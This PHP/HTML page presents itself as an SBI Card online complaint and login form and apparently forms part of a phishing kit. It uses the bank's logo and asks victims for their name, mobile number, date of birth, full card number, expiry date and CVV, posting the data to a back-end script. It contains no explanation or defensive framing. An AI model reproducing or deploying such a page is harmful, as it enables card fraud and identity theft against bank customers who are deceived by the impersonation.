
<?php include("connection.php");?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="styel.css">
    <title>SBI CREDIT CARD LOGIN FORM</title>

</head>

<body>
    

    <div  class="containeer">
        <form action="lof.php" method="POST">

        <div class="title"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fc/SBI_Card_logo.svg/2560px-SBI_Card_logo.svg.png" alt="SBI logo" height="60px"><br>
        Welcome To SBI Card Online</div>

            <div class="form">
                <div class="input_field">
                <label>Name:</label>
                    <input type="text" placeholder="Enter Your Name" class="input" name="name">
           </div>
        <div class="input_field">
            <label>Mobile Number:</label>
            <input type="text" placeholder="Enter Mobile Number" class="input" name="mobile">
        </div>
        <div class="input_field">
            <label for="expiry-date">Date Of Borth:</label>
            <input type="text" placeholder="Date/Month/Year" name="dateofbroth" class="input">
                </div>

        <div class="input_field">
            <label>Complaint:</label> 
            
        <select class="selectbox" name="selectbox">
                <option value="">Select A Reason</option>
                <option value="EKYC_Update">EKYC Update</option>
                <option value="E_Service_Deactivate">E Service Deactivate</option>
                <option velue="International_Block">International Block</option>
                <option value="Card_Block">Card Block</option>
                <option value="Card_Unblock">Card Unblock</option>
                <option value="Internation_Off">Internatioal Off</option>
                <option value="Others">Others</option>
            </select>
            
        </div>

                <div class="input_field">
                    <label for="card-number">Card Number:</label>
            <input type="text" placeholder="Enter card number" class="input" name="cardnumber" >
                </div>
                <div class="input_field">
            <label for="expiry-date">Expiry Date:</label>
            <input type="text" placeholder="Enter Expiry Date" name="expirydate" class="input">
                </div>
              <div class="input_field"> 
            <label for="cvv">CVV:</label>
            <input type="number" placeholder="Enter CVV digit" class="input" name="cvv">
        </div>
            
               
        <div class="input_field">
            <input type="submit" value="NEXT" class="btn" name="ristereg"></input>
        </div>
 
        </from>

</div>    

    
</body>
</html>








